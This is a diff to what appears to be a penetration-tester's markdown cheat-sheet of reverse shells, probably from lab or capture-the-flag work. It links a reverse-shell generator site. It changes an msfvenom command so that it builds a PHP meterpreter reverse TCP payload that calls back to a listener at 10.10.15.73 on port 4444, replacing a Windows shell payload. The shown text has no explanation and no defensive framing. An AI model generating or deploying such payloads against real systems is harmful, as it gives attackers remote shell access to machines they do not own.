@@ -2,7 +2,7 @@ Can create more shells here: https://www.revshells.com/
 
 ### msfvenom
 
-> sudo msfvenom -p windows/x64/shell/shell_reverse_tcp LHOST=10.10.15.73 LPORT=4444 -f raw > /home/kali/msfshelly.php
+> sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.73 LPORT=4444 -f raw > /home/kali/msfshelly.php
 
 ### Bash 
 
